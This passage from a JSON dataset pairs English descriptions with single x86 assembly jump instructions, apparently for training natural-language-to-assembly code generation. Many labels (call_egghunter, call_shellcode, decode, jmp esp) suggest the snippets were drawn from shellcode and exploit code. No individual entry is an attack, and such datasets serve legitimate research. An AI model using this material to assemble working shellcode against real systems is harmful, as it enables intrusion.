    "intent_tokens": [
      "jump",
      "_while_loop",
      "if",
      "lower"
    ],
    "snippet_tokens": [
      "jl",
      "_while_loop"
    ]
  },
  {
    "intent": "jump to the _while_loop label if the destination operand is less than the source operand in the above comparison",
    "rewritten_intent": "jump to the _while_loop label if the destination operand is less than the source operand in the above comparison",
    "snippet": "jl _while_loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "_while_loop",
      "label",
      "if",
      "destination",
      "operand",
      "less",
      "source",
      "operand",
      "above",
      "comparison"
    ],
    "snippet_tokens": [
      "jl",
      "_while_loop"
    ]
  },
  {
    "intent": "jump if less than to label finished",
    "rewritten_intent": "jump if less than to label finished",
    "snippet": "jl finished",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "if",
      "less",
      "label",
      "finished"
    ],
    "snippet_tokens": [
      "jl",
      "finished"
    ]
  },
  {
    "intent": "jump to the wrap_around label if the destination operand is less than the source operand in the above comparison",
    "rewritten_intent": "jump to the wrap_around label if the destination operand is less than the source operand in the above comparison",
    "snippet": "jl wrap_around",
    "slot_map": {
      "wrap_around": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "destination",
      "operand",
      "less",
      "source",
      "operand",
      "above",
      "comparison"
    ],
    "snippet_tokens": [
      "jl",
      "var0"
    ]
  },
  {
    "intent": "if it is less than or equal to 10 then jump to lp1",
    "rewritten_intent": "if it is less than or equal to 10 then jump to lp1",
    "snippet": "jle lp1",
    "slot_map": {
      "lp1": "var0"
    },
    "intent_tokens": [
      "if",
      "it",
      "less",
      "or",
      "equal",
      "10",
      "then",
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jle",
      "var0"
    ]
  },
  {
    "intent": "jump to label _accept",
    "rewritten_intent": "jump to label _accept",
    "snippet": "jmp _accept",
    "slot_map": {
      "_accept": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to _read",
    "rewritten_intent": "jump to _read",
    "snippet": "jmp _read",
    "slot_map": {
      "_read": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the _return label",
    "rewritten_intent": "jump to the _return label",
    "snippet": "jmp _return",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "_return",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "_return"
    ]
  },
  {
    "intent": "jump to _star",
    "rewritten_intent": "jump to _star",
    "snippet": "jmp _star",
    "slot_map": {
      "_star": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the _start label",
    "rewritten_intent": "jump to the _start label",
    "snippet": "jmp _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the _while_loop label",
    "rewritten_intent": "jump to the _while_loop label",
    "snippet": "jmp _while_loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "_while_loop",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "_while_loop"
    ]
  },
  {
    "intent": "jump to the aslr_file label",
    "rewritten_intent": "jump to the aslr_file label",
    "snippet": "jmp aslr_file",
    "slot_map": {
      "aslr_file": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the instruction labeled begin",
    "rewritten_intent": "jump to the instruction labeled begin",
    "snippet": "jmp begin",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "instruction",
      "labeled",
      "begin"
    ],
    "snippet_tokens": [
      "jmp",
      "begin"
    ]
  },
  {
    "intent": "jump to the call_egghunter label",
    "rewritten_intent": "jump to the call_egghunter label",
    "snippet": "jmp call_egghunter",
    "slot_map": {
      "call_egghunter": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to callpop",
    "rewritten_intent": "jump to callpop",
    "snippet": "jmp callpop",
    "slot_map": {
      "callpop": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the callpop label",
    "rewritten_intent": "jump to the callpop label",
    "snippet": "jmp callpop",
    "slot_map": {
      "callpop": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the callz label",
    "rewritten_intent": "jump to the callz label",
    "snippet": "jmp callz",
    "slot_map": {
      "callz": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the carryon label",
    "rewritten_intent": "jump to the carryon label",
    "snippet": "jmp carryon",
    "slot_map": {
      "carryon": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to connec",
    "rewritten_intent": "jump to connec",
    "snippet": "jmp connec",
    "slot_map": {
      "connec": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to eax",
    "rewritten_intent": "jump to eax",
    "snippet": "jmp eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the value stored in the eax register",
    "rewritten_intent": "jump to the value stored in the eax register",
    "snippet": "jmp eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "value",
      "stored",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to ecx",
    "rewritten_intent": "jump to ecx",
    "snippet": "jmp ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to edi",
    "rewritten_intent": "jump to edi",
    "snippet": "jmp edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the edi label",
    "rewritten_intent": "jump to the edi label",
    "snippet": "jmp edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to edx",
    "rewritten_intent": "jump to edx",
    "snippet": "jmp edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the encrypt label",
    "rewritten_intent": "jump to the encrypt label",
    "snippet": "jmp encrypt",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "encrypt",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "encrypt"
    ]
  },
  {
    "intent": "jump to the entrypoint label",
    "rewritten_intent": "jump to the entrypoint label",
    "snippet": "jmp entrypoint",
    "slot_map": {
      "entrypoint": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the esp label",
    "rewritten_intent": "jump to the esp label",
    "snippet": "jmp esp",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "esp",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "esp"
    ]
  },
  {
    "intent": "jump to fupdisasm+1",
    "rewritten_intent": "jump to fupdisasm+1",
    "snippet": "jmp fupdisasm+1",
    "slot_map": {
      "fupdisasm+1": "var0"
    },
    "intent_tokens": [
      "jump",
      "fupdisasm+1"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the address specified by the operation fupdisasm+1",
    "rewritten_intent": "jump to the address specified by the operation fupdisasm+1",
    "snippet": "jmp fupdisasm+1",
    "slot_map": {
      "fupdisasm+1": "var0"
    },
    "intent_tokens": [
      "jump",
      "address",
      "specified",
      "operation",
      "fupdisasm+1"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the address specified by the operation fupdisasm+3",
    "rewritten_intent": "jump to the address specified by the operation fupdisasm+3",
    "snippet": "jmp fupdisasm+3",
    "slot_map": {
      "fupdisasm+3": "var0"
    },
    "intent_tokens": [
      "jump",
      "address",
      "specified",
      "operation",
      "fupdisasm+3"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the jocker label",
    "rewritten_intent": "jump to the jocker label",
    "snippet": "jmp jocker",
    "slot_map": {
      "jocker": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to label l20",
    "rewritten_intent": "jump to label l20",
    "snippet": "jmp l20",
    "slot_map": {
      "l20": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the label loop",
    "rewritten_intent": "jump to the label loop",
    "snippet": "jmp loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "loop"
    ],
    "snippet_tokens": [
      "jmp",
      "loop"
    ]
  },
  {
    "intent": "jump to label multiplyloop",
    "rewritten_intent": "jump to label multiplyloop",
    "snippet": "jmp multiplyloop",
    "slot_map": {
      "multiplyloop": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to nextarg label",
    "rewritten_intent": "jump to nextarg label",
    "snippet": "jmp nextarg",
    "slot_map": {
      "nextarg": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the point in the code labeled nextchar",
    "rewritten_intent": "jump to the point in the code labeled nextchar",
    "snippet": "jmp nextchar",
    "slot_map": {
      "nextchar": "var0"
    },
    "intent_tokens": [
      "jump",
      "point",
      "code",
      "labeled",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the one label",
    "rewritten_intent": "jump to the one label",
    "snippet": "jmp one",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "one",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "one"
    ]
  },
  {
    "intent": "jump to the read label",
    "rewritten_intent": "jump to the read label",
    "snippet": "jmp read",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "read",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "read"
    ]
  },
  {
    "intent": "jump to the label read",
    "rewritten_intent": "jump to the label read",
    "snippet": "jmp read",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "read"
    ],
    "snippet_tokens": [
      "jmp",
      "read"
    ]
  },
  {
    "intent": "jump to label read",
    "rewritten_intent": "jump to label read",
    "snippet": "jmp read",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "read"
    ],
    "snippet_tokens": [
      "jmp",
      "read"
    ]
  },
  {
    "intent": "jump to the reading label",
    "rewritten_intent": "jump to the reading label",
    "snippet": "jmp reading",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "reading",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "reading"
    ]
  },
  {
    "intent": "jump to the shell label",
    "rewritten_intent": "jump to the shell label",
    "snippet": "jmp shell",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "shell",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "shell"
    ]
  },
  {
    "intent": "jump to shellcode",
    "rewritten_intent": "jump to shellcode",
    "snippet": "jmp shellcode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "shellcode"
    ],
    "snippet_tokens": [
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "jump to the shellcode label",
    "rewritten_intent": "jump to the shellcode label",
    "snippet": "jmp shellcode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "jump short to the _cmd label",
    "rewritten_intent": "jump short to the _cmd label",
    "snippet": "jmp short _cmd",
    "slot_map": {
      "_cmd": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the _execline label",
    "rewritten_intent": "jump short to the _execline label",
    "snippet": "jmp short _execline",
    "slot_map": {
      "_execline": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the _file label",
    "rewritten_intent": "jump short to the _file label",
    "snippet": "jmp short _file",
    "slot_map": {
      "_file": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the _load_data label",
    "rewritten_intent": "jump short to the _load_data label",
    "snippet": "jmp short _load_data",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "_load_data",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "_load_data"
    ]
  },
  {
    "intent": "jump short to _load_data label",
    "rewritten_intent": "jump short to _load_data label",
    "snippet": "jmp short _load_data",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "_load_data",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "_load_data"
    ]
  },
  {
    "intent": "jump short to _star label",
    "rewritten_intent": "jump short to _star label",
    "snippet": "jmp short _star",
    "slot_map": {
      "_star": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the _start label",
    "rewritten_intent": "jump short to the _start label",
    "snippet": "jmp short _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the .exit label",
    "rewritten_intent": "jump short to the .exit label",
    "snippet": "jmp short .exit",
    "slot_map": {
      ".exit": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to 0x11",
    "rewritten_intent": "jump short to 0x11",
    "snippet": "jmp short 0x11",
    "slot_map": {
      "0x11": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to 0x2c",
    "rewritten_intent": "jump short to 0x2c",
    "snippet": "jmp short 0x2c",
    "slot_map": {
      "0x2c": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to 0x34",
    "rewritten_intent": "jump short to 0x34",
    "snippet": "jmp short 0x34",
    "slot_map": {
      "0x34": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to 0x63",
    "rewritten_intent": "jump short to 0x63",
    "snippet": "jmp short 0x63",
    "slot_map": {
      "0x63": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the function call_decoder",
    "rewritten_intent": "jump short to the function call_decoder",
    "snippet": "jmp short call_decoder",
    "slot_map": {
      "call_decoder": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "function",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the call_shellcode label",
    "rewritten_intent": "jump short to the call_shellcode label",
    "snippet": "jmp short call_shellcode",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the callit label",
    "rewritten_intent": "jump short to the callit label",
    "snippet": "jmp short callit",
    "slot_map": {
      "callit": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the callme label",
    "rewritten_intent": "jump short to the callme label",
    "snippet": "jmp short callme",
    "slot_map": {
      "callme": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the cmd label",
    "rewritten_intent": "jump short to the cmd label",
    "snippet": "jmp short cmd",
    "slot_map": {
      "cmd": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the cycle label",
    "rewritten_intent": "jump short to the cycle label",
    "snippet": "jmp short cycle",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "cycle",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "cycle"
    ]
  },
  {
    "intent": "jump short to cycle label",
    "rewritten_intent": "jump short to cycle label",
    "snippet": "jmp short cycle",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "cycle",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "cycle"
    ]
  },
  {
    "intent": "jump short to the function decode",
    "rewritten_intent": "jump short to the function decode",
    "snippet": "jmp short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "function",
      "decode"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "decode"
    ]
  },
  {
    "intent": "jump short to the decode label",
    "rewritten_intent": "jump short to the decode label",
    "snippet": "jmp short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "decode",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "decode"
    ]
  },
  {
    "intent": "jump short to the decode_pr label",
    "rewritten_intent": "jump short to the decode_pr label",
    "snippet": "jmp short decode_pr",
    "slot_map": {
      "decode_pr": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the end label",
    "rewritten_intent": "jump short to the end label",
    "snippet": "jmp short end",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "end",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "end"
    ]
  },
  {
    "intent": "jump short to exi label",
    "rewritten_intent": "jump short to exi label",
    "snippet": "jmp short exi",
    "slot_map": {
      "exi": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the fileaddress label",
    "rewritten_intent": "jump short to the fileaddress label",
    "snippet": "jmp short fileaddress",
    "slot_map": {
      "fileaddress": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the formatting label",
    "rewritten_intent": "jump short to the formatting label",
    "snippet": "jmp short formatting",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "formatting",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "formatting"
    ]
  },
  {
    "intent": "jump short to the four label",
    "rewritten_intent": "jump short to the four label",
    "snippet": "jmp short four",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "four",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "four"
    ]
  },
  {
    "intent": "jump short to the gotocall label",
    "rewritten_intent": "jump short to the gotocall label",
    "snippet": "jmp short gotocall",
    "slot_map": {
      "gotocall": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the here label",
    "rewritten_intent": "jump short to the here label",
    "snippet": "jmp short here",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "here",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "here"
    ]
  },
  {
    "intent": "jump short to the routine inc_dec",
    "rewritten_intent": "jump short to the routine inc_dec",
    "snippet": "jmp short inc_dec",
    "slot_map": {
      "inc_dec": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "routine",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the path label",
    "rewritten_intent": "jump short to the path label",
    "snippet": "jmp short path",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "path",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "path"
    ]
  },
  {
    "intent": "jump short to the process_shellcode label",
    "rewritten_intent": "jump short to the process_shellcode label",
    "snippet": "jmp short process_shellcode",
    "slot_map": {
      "process_shellcode": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to push_cmd",
    "rewritten_intent": "jump short to push_cmd",
    "snippet": "jmp short push_cmd",
    "slot_map": {
      "push_cmd": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the push_cmd label",
    "rewritten_intent": "jump short to the push_cmd label",
    "snippet": "jmp short push_cmd",
    "slot_map": {
      "push_cmd": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the read label",
    "rewritten_intent": "jump short to the read label",
    "snippet": "jmp short read",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "read",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "read"
    ]
  },
  {
    "intent": "jump short to the rotate label",
    "rewritten_intent": "jump short to the rotate label",
    "snippet": "jmp short rotate",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "rotate",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "rotate"
    ]
  },
  {
    "intent": "jump short to the search label",
    "rewritten_intent": "jump short to the search label",
    "snippet": "jmp short search",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "search",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "search"
    ]
  },
  {
    "intent": "jump short to the setup label",
    "rewritten_intent": "jump short to the setup label",
    "snippet": "jmp short setup",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "setup",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "setup"
    ]
  },
  {
    "intent": "jump short to shellcode",
    "rewritten_intent": "jump short to shellcode",
    "snippet": "jmp short shellcode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "shellcode"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "shellcode"
    ]
  },
  {
    "intent": "jump short to stage",
    "rewritten_intent": "jump short to stage",
    "snippet": "jmp short stage",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "stage"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "stage"
    ]
  },
  {
    "intent": "jump short to the stage label",
    "rewritten_intent": "jump short to the stage label",
    "snippet": "jmp short stage",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "stage",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "stage"
    ]
  },
  {
    "intent": "jump short to the todo label",
    "rewritten_intent": "jump short to the todo label",
    "snippet": "jmp short todo",
    "slot_map": {
      "todo": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the two label",
    "rewritten_intent": "jump short to the two label",
    "snippet": "jmp short two",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "two",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "two"
    ]
  },
  {
    "intent": "jump to the two label",
    "rewritten_intent": "jump to the two label",
    "snippet": "jmp two",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "two",
      "label"
    ],
    "snippet_tokens": [
      "jmp",
      "two"
    ]
  },
  {
    "intent": "define the jmp_search label",
    "rewritten_intent": "define the jmp_search label",
    "snippet": "jmp_search:",
    "slot_map": {
      "jmp_search": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "jump to 0xd8 it the carry flag is zero",
    "rewritten_intent": "jump to 0xd8 it the carry flag is zero",
    "snippet": "jnc 0xd8",
    "slot_map": {
      "0xd8": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "it",
      "carry",
      "flag",
      "zero"
    ],
    "snippet_tokens": [
      "jnc",
      "var0"
    ]
  },
  {
    "intent": "if not equal jump to the _nex label",
    "rewritten_intent": "if not equal jump to the _nex label",
    "snippet": "jne _nex",
    "slot_map": {
      "_nex": "var0"
    },
    "intent_tokens": [
      "if",
      "not",
      "equal",
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "jump to the _next label if the operands of the above comparison are not equals",
    "rewritten_intent": "jump to the _next label if the operands of the above comparison are not equals",
    "snippet": "jne _next",
    "slot_map": {
      "_next": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "operands",
      "above",
      "comparison",
      "not",
      "equals"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "jump to 804809a if not equal",
    "rewritten_intent": "jump to 804809a if not equal",
    "snippet": "jne 804809a",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "804809a",
      "if",
      "not",
      "equal"
    ],
    "snippet_tokens": [
      "jne",
      "804809a"
    ]
  },
  {
    "intent": "jump to 80480aa if not equal",
    "rewritten_intent": "jump to 80480aa if not equal",
    "snippet": "jne 80480aa",
    "slot_map": {
      "80480aa": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "equal"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "if the remainder is not equal to zero jump to local label checkbuzz",
    "rewritten_intent": "if the remainder is not equal to zero jump to local label checkbuzz",
    "snippet": "jne checkbuzz",
    "slot_map": {
      "checkbuzz": "var0"
    },
    "intent_tokens": [
      "if",
      "remainder",
      "not",
      "equal",
      "zero",
      "jump",
      "local",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "if the remainder is not equal to zero jump to local label checkint",
    "rewritten_intent": "if the remainder is not equal to zero jump to local label checkint",
    "snippet": "jne checkint",
    "slot_map": {
      "checkint": "var0"
    },
    "intent_tokens": [
      "if",
      "remainder",
      "not",
      "equal",
      "zero",
      "jump",
      "local",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "jump to the address specified by the label loop if the operands are not equals in the previous comparison",
    "rewritten_intent": "jump to the address specified by the label loop if the operands are not equals in the previous comparison",
    "snippet": "jne loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "address",
      "specified",
      "label",
      "loop",
      "if",
      "operands",
      "not",
      "equals",
      "previous",
      "comparison"
    ],
    "snippet_tokens": [
      "jne",
      "loop"
    ]
  },
  {
    "intent": "jump to the next_addr label if the operands of the above comparison are not equals",
    "rewritten_intent": "jump to the next_addr label if the operands of the above comparison are not equals",
    "snippet": "jne next_addr",
    "slot_map": {
      "next_addr": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "operands",
      "above",
      "comparison",
      "not",
      "equals"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "if not equal jump to the label nextnumber",
    "rewritten_intent": "if not equal jump to the label nextnumber",
    "snippet": "jne nextnumber",
    "slot_map": {
      "nextnumber": "var0"
    },
    "intent_tokens": [
      "if",
      "not",
      "equal",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "jump to the label no_error if not equal",
    "rewritten_intent": "jump to the label no_error if not equal",
    "snippet": "jne no_error",
    "slot_map": {
